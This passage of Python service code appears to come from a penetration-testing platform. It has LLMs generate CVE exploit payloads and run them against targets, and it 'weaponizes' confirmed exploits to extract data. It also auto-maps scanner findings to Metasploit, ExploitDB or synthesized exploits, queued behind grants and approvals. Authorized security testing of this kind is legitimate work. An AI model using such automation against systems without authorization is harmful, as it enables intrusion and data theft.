    gen_s = round(_t.time() - t0, 1)
    # Capture LLM token/latency metrics so the diff view can show cost + speed per model.
    prompt_tokens = int((res or {}).get("prompt_tokens") or 0)
    eval_tokens = int((res or {}).get("eval_count") or 0)
    latency_ms = float((res or {}).get("latency_ms") or 0)
    total_tokens = int((res or {}).get("total_tokens") or (prompt_tokens + eval_tokens))
    assertion = {"expect_regex": canary, "canary": canary, "cve_anchored": True}
    output, hit = "", False
    if command:
        listener = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")
        try:
            lr = _hx.post(f"{listener.rstrip('/')}/vectors/run",
                          json={"command": command, "target": str(ip), "port": port, "timeout": 60},
                          headers={"x-api-key": API_KEY}, verify=False, timeout=120)
            d = lr.json() if lr.status_code < 400 else {}
            output = (d.get("output", "") if isinstance(d, dict) else "") or lr.text
        except Exception as e:  # noqa: BLE001
            output = f"listener error: {e}"
        hit = _poc_assertion_passes(assertion, output)
    short = model.split("/")[-1]
    art = _exploit_store_artifacts("web", command, f"{cve} via {short}", cve, "", assertion)
    row = {"id": store_id, "name": f"{cve} via {short}", "command": command, "assertion": assertion,
           "python_code": art["python_code"], "http_request": art["http_request"],
           "rationale": f"Payload generated by {model}", "verified": hit, "llm_model": model,
           "metadata": {"model": model, "canary_hit": hit, "gen_seconds": gen_s, "bakeoff": True,
                        "cve": cve, "output_snippet": (output or "")[:300],
                        "prompt_tokens": prompt_tokens, "completion_tokens": eval_tokens,
                        "total_tokens": total_tokens, "llm_latency_ms": latency_ms}}
    ver = None
    try:
        with get_db() as conn, conn.cursor() as cur:
            ver, _vid = _snapshot_exploit_version(cur, row, label=f"model:{short}", created_by="bakeoff")
            conn.commit()
    except Exception as e:  # noqa: BLE001
        logging.debug("bakeoff save failed: %s", e)
    return {"model": model, "gen_seconds": gen_s, "canary_hit": hit, "version": ver,
            "command": command[:200], "output": (output or "")[:200], "ok": bool(command)}


class BakeoffBody(BaseModel):
    models: Optional[List[str]] = None   # default: all local ollama models
    release: bool = False                # authorize this endpoint (grant) for the run


@app.post("/exploit-store/{exploit_id}/bakeoff", tags=["Exploit Store"])
def exploit_bakeoff(exploit_id: str, body: BakeoffBody, authorized: bool = Depends(auth)):
    """Model bake-off: generate a payload for this exploit's CVE with EACH model, run each
    against the target, and save every payload as a selectable VERSION labeled by model.
    Grant-gated (it sends traffic). Shares one research pass across all models. Returns the
    per-model verdicts (canary hit = the exploit's own effect landed)."""
    _ensure_exploit_store()
    eid = _validate_engagement_uuid(_resolve_engagement_id())
    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
        cur.execute("SELECT * FROM exploit_store WHERE id = %s", (exploit_id,))
        row = cur.fetchone()
    if not row:
        raise HTTPException(404, "exploit not found")
    if not row["cve"] or not row["target_host"]:
        raise HTTPException(400, "bake-off needs a CVE and a target on the entry")
    ip, port = row["target_host"], row["target_port"] or 80
    # Fail-closed: the bake-off RUNS payloads, so the endpoint must be released (grant).
    if body.release:
        _grant_poc(ip, port, eid, granted_by="operator", note=f"bakeoff {row['cve']}")
    elif not _poc_grant_active(ip, port, eid):
        raise HTTPException(403, "bake-off is not released for this endpoint; release it (grant) first")
    models = body.models or _ollama_tags()
    if not models:
        raise HTTPException(400, "no models available (no local ollama models; pass models=[...])")
    # One shared research pass (cloud default) feeds every model the same material.
    guidance = ""
    try:
        r = _research_exploit(row["cve"], ip, port, row["product"], row["version"], eid)
        a = r.get("analysis") or {}
        if a:
            guidance = (f"Reference: endpoint={a.get('target_endpoint')} method={a.get('http_method')} "
                        f"params={a.get('params')} payload={a.get('payload')}.")
        elif r.get("reference_poc"):
            guidance = "Reference PoC:\n" + str(r["reference_poc"])[:2000]
    except Exception:  # noqa: BLE001
        pass
    results = [_bakeoff_one(row["cve"], ip, port, exploit_id, m, eid, guidance) for m in models]
    try:
        emit_webhook("exploit_bakeoff", "exploit_store",
                     {"id": exploit_id, "cve": row["cve"], "target": ip, "models": len(models),
                      "hits": sum(1 for x in results if x.get("canary_hit"))})
    except Exception:  # noqa: BLE001
        pass
    return {"ok": True, "cve": row["cve"], "target": f"{ip}:{port}", "results": results}


class WeaponizeBody(BaseModel):
    objective: Optional[str] = None      # what to extract; default = the class's objective
    vuln_class: Optional[str] = None     # override the inferred class
    max_iters: int = 4
    model: Optional[str] = None
    release: bool = False
    username: Optional[str] = None       # auth for an authenticated surface
    password: Optional[str] = None
    login_url: Optional[str] = None


@app.post("/exploit-store/{exploit_id}/weaponize", tags=["Exploit Store"])
def weaponize_exploit(exploit_id: str, body: WeaponizeBody, authorized: bool = Depends(auth)):
    """Post-exploitation: weaponize this CONFIRMED exploit into EXTRACTED DATA. Runs the
    weaponization loop that ENUMERATES each command's output (fixes errors, discovers
    structure, chases the data deeper) per the postex_web skill. GATED/impactful — needs a
    release (grant) since it reads/modifies the target. Saves the loot as a version + a
    security_test."""
    _ensure_exploit_store()
    eid = _validate_engagement_uuid(_resolve_engagement_id())
    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
        cur.execute("SELECT * FROM exploit_store WHERE id = %s", (exploit_id,))
        row = cur.fetchone()
    if not row:
        raise HTTPException(404, "exploit not found")
    if not row["command"] or not row["target_host"]:
        raise HTTPException(400, "entry needs a confirmed command and a target")
    ip, port = row["target_host"], row["target_port"] or 80
    if body.release:
        _grant_poc(ip, port, eid, granted_by="operator", note=f"weaponize {row['cve']}")
    elif not _poc_grant_active(ip, port, eid):
        raise HTTPException(403, "weaponization is not released for this endpoint; release (grant) it first")
    # infer the vuln class: explicit -> stored -> match on the CVE
    vclass = body.vuln_class or (row["metadata"] or {}).get("vuln_class")
    if not vclass:
        try:
            from common import vuln_skills as _vs
            details = _fetch_cve_details(row["cve"]) or {}
            m = _vs.match(name=(details.get("description") or "")[:400], issue_type=row["cve"])
            vclass = m.get("canonical") if m else None
        except Exception:  # noqa: BLE001
            vclass = None
    if not vclass:
        raise HTTPException(400, "could not infer the vuln class; pass vuln_class")
    # optional auth
    session_cookie = None
    if body.username or body.password:
        s = _establish_session_for_build(ip, port, {"username": body.username, "password": body.password,
                                                     "login_url": body.login_url}, eid)
        session_cookie = (s or {}).get("cookie_header") or None
    result = _run_postex_weaponize(row["cve"], ip, port, vclass, row["command"], eid,
                                   objective=body.objective, max_iters=body.max_iters,
                                   model=body.model, session_cookie=session_cookie)
    # save the weaponized command + extracted data as a version of the entry
    try:
        if result.get("final_command"):
            with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
                cur.execute("SELECT * FROM exploit_store WHERE id = %s", (exploit_id,))
                cur_row = cur.fetchone()
                vrow = dict(cur_row)
                vrow["command"] = result["final_command"]
                vrow["verified"] = result.get("extracted")
                vrow["metadata"] = {**(cur_row["metadata"] or {}), "postex": True,
                                    "objective": result.get("objective"),
                                    "extracted": result.get("extracted_data")}
                _snapshot_exploit_version(cur, vrow, label=f"postex:{vclass} ({'extracted' if result.get('extracted') else 'attempted'})")
                conn.commit()
    except Exception:  # noqa: BLE001
        pass
    return {"ok": True, "cve": row["cve"], "target": f"{ip}:{port}", "vuln_class": vclass, **result}


def _resolve_and_queue_exploit(cve, ip, port, product, version, eid, dedupe=True):
    """Resolve a targeted exploit for a scanner-confirmed CVE (Metasploit ->
    ExploitDB -> synthesize) and queue it as an approval-gated pending_exploit.
    Shared by the /software/resolve-exploit endpoint and the auto-resolver on scan
    ingest. dedupe=True skips when a cve_resolver candidate for (ip, cve) exists."""
    import requests as _rq, uuid as _uuid
    from etl.cve_exploit_resolver import resolve_exploit_for_cve
    cve = (cve or "").strip().upper()
    if not cve.startswith("CVE-"):
        return {"ok": False, "method": "none", "pending_exploit_id": None, "message": "not a CVE id"}
    port = port or 80
    if dedupe:
        with get_db() as conn, conn.cursor() as cur:
            cur.execute("""SELECT 1 FROM pending_exploits WHERE requested_by='cve_resolver'
                            AND target_ip=%s AND metadata->>'cve'=%s LIMIT 1""", (ip, cve))
            if cur.fetchone():
                return {"ok": True, "method": "exists", "pending_exploit_id": None, "message": "already resolved"}

    def _msf():
        r = _rq.get(f"{EXPLOIT_RUNNER_URL}/msf/search", params={"cve": cve, "limit": 1},
                    headers={"x-api-key": API_KEY}, verify=False, timeout=45)
        res = (r.json() or {}).get("results") if r.ok else None
        return res[0] if res else None

    def _edb():
        r = _rq.get(f"{EXPLOIT_RUNNER_URL}/exploitdb/search", params={"cve": cve, "limit": 1},
                    headers={"x-api-key": API_KEY}, verify=False, timeout=45)
        res = (r.json() or {}).get("results") if r.ok else None
        return res[0] if res else None

    def _synth():
        # No public MSF/ExploitDB module -> AUTOMATIC CREATION. If the endpoint is
        # released (grant active), run the FULL build loop (research -> synthesize ->
        # run-refine -> anchor/reflection verify -> save to Exploit Store) so a working,
        # verified PoC is produced automatically. Fail-closed: with no grant we fall back
        # to a first-draft (Increment 1) queued for approval, and note that releasing the
        # endpoint enables auto-creation.
        if _poc_grant_active(ip, port, eid):
            core = _build_poc_core(cve, ip, port, product, version, eid)
            if core.get("final_command"):
                return {"command": core.get("final_command"),
                        "assertion": core.get("final_assertion"),
                        "rationale": "", "synth_kind": core.get("synth_kind"),
                        "run_id": None, "auto_created": True,
                        "verified": core.get("verified"),
                        "exploit_store_id": core.get("exploit_store_id")}
            return None
        return _synthesize_cve_poc_with_shadow(cve, ip, port, product, version, eid)

    resolution = resolve_exploit_for_cve(cve, _msf, _edb, _synth)
    method = resolution["method"]
    ex = resolution["exploit"] or {}
    if method == "none":
        return {"ok": True, "method": "none", "pending_exploit_id": None,
                "message": "no MSF/ExploitDB module and synthesis produced nothing"}

    if method == "metasploit":
        module = ex.get("module") or ex.get("name")
        source, exploit_id, edb_id = "metasploit", module, None
        title = f"{cve} via MSF {module}"
        cmd = f"use {module}; set RHOSTS {ip}; set RPORT {port}"
        params = {"module_path": module}
    elif method == "exploitdb":
        edb_id = str(ex.get("edb_id") or ex.get("id") or "")
        source, exploit_id = "exploitdb", edb_id
        title = f"{cve} via ExploitDB EDB-{edb_id}: {ex.get('title','')[:80]}"
        cmd = ""
        params = {"edb_id": edb_id}
    else:  # synth
        source, exploit_id, edb_id = "command", cve, None
        auto = ex.get("auto_created")
        vfd = " [verified]" if ex.get("verified") else ""
        title = (f"{cve} auto-created PoC (no MSF/EDB module){vfd}" if auto
                 else f"{cve} synthesised PoC (no MSF/EDB module)")
        cmd = ex.get("command", "")
        # When auto-created via the full loop, the command/assertion are the refined
        # (and possibly verified) ones and the PoC is already in the Exploit Store.
        params = {"vector_id": cve, "synthesized": True, "run_id": ex.get("run_id"),
                  "auto_created": bool(auto), "verified": bool(ex.get("verified")),
                  "exploit_store_id": ex.get("exploit_store_id"),
                  "success": ex.get("assertion") or {"expect_regex": "(?i)(uid=|root|flag|vulnerable)"}}

    with get_db() as conn, conn.cursor() as cur:
        cur.execute("SELECT id FROM assets WHERE host(ip)::text = %s AND (engagement_id = %s::uuid OR %s IS NULL) LIMIT 1",
                    (ip, eid, eid))
        row = cur.fetchone()
        asset_id = row[0] if row else None
        reason = f"Scanner-confirmed {cve} resolved to a {method} exploit (detection->exploit bridge)."
        meta = {"cve": cve, "resolver_method": method, "scanner_confirmed": True,
                "synthesized": method == "synth", "product": product, "version": version,
                "auto_created": bool(ex.get("auto_created")),
                "verified": bool(ex.get("verified")),
                "exploit_store_id": ex.get("exploit_store_id")}
        pid = str(_uuid.uuid4())
        cur.execute("""
            INSERT INTO pending_exploits
            (id, source, exploit_id, exploit_title, exploit_type, target_ip, target_port,
             target_service, target_version, customized_command, parameters,
             match_confidence, match_reasoning, status, requested_by, metadata,
             asset_id, engagement_id, edb_id)
            VALUES (%s,%s,%s,%s,'rce',%s,%s,%s,%s,%s,%s,%s,%s,'pending','cve_resolver',%s,%s,%s,%s)
        """, (pid, source, exploit_id, title, ip, port, product, version,
              cmd, Json(params), 0.9, reason, Json(meta), asset_id, eid, edb_id))
        conn.commit()
    try:
        emit_webhook("cve_exploit_resolved", "software",
                     {"cve": cve, "method": method, "target": ip, "pending_exploit_id": pid})
    except Exception:  # noqa: BLE001
        pass
    return {"ok": True, "method": method, "pending_exploit_id": pid, "exploit": ex}


def _auto_resolve_flagged_cves(eid, limit=5):
    """After a scan flags scanner-confirmed CVEs, auto-resolve targeted exploits for
    the un-resolved high/critical ones (approval-gated). Bounded per call; idempotent
    (dedupe), so a large backlog drains over successive ingests without flooding."""
    try:
        import re as _re
        from psycopg2.extras import RealDictCursor as _RDC
        with get_db() as conn, conn.cursor(cursor_factory=_RDC) as cur:
            cur.execute("""SELECT target, title, metadata FROM follow_up_items
                            WHERE rule_id='software_known_cve' AND severity IN ('critical','high')
                              AND status NOT IN ('resolved','dismissed')
                            ORDER BY (severity='critical') DESC LIMIT 60""")
            rows = cur.fetchall()
        done = 0
        for r in rows:
            if done >= limit:
                break
            try:  # per-row isolation: one bad CVE must not abort the whole batch
                ip = r["target"]
                md = r["metadata"] or {}
                if isinstance(md, str):
                    import json as _json
                    try: md = _json.loads(md)
                    except Exception: md = {}
                cves = md.get("cve_ids") or _re.findall(r"CVE-\d{4}-\d+", r["title"] or "")
                if not ip or ip == "unknown" or not cves:
                    continue
                # best web port for this host (synth needs it; MSF/EDB are port-agnostic)
                port = None
                try:
                    with get_db() as c2, c2.cursor() as cur2:
                        cur2.execute("""SELECT p.port FROM ports p JOIN assets a ON p.asset_id=a.id
                                         WHERE host(a.ip)::text=%s ORDER BY (p.port IN (443,8443)) DESC,
                                               (p.port IN (80,8080,9090,8000)) DESC LIMIT 1""", (ip,))
                        pr = cur2.fetchone()
                        port = pr[0] if pr else None
                except Exception:  # noqa: BLE001
                    pass
                res = _resolve_and_queue_exploit(cves[0], ip, port, md.get("product"), md.get("version"), eid, dedupe=True)
                if res.get("method") not in ("exists", "none", None, False):
                    done += 1
            except Exception as _re2:  # noqa: BLE001
                logging.debug("auto-resolve row failed: %s", _re2)
                continue
        if done:
            logging.info("auto-resolver queued %s targeted exploit(s) from flagged CVEs", done)
    except Exception as e:  # noqa: BLE001
        logging.debug("auto-resolve flagged cves failed: %s", e)


@app.post("/software/resolve-exploit", tags=["Assets"])
def resolve_exploit_for_cve_endpoint(body: ResolveExploitBody, authorized: bool = Depends(auth)):
    """Detection -> exploit resolver (phase 2): for a scanner-confirmed CVE, find a
    targeted exploit in order Metasploit -> ExploitDB -> synthesize, and queue it as
    a pending_exploit (approval-gated). Returns {method, pending_exploit_id}."""
    eid = _validate_engagement_uuid(_resolve_engagement_id())
    return _resolve_and_queue_exploit(body.cve, body.ip, body.port, body.product, body.version, eid, dedupe=False)


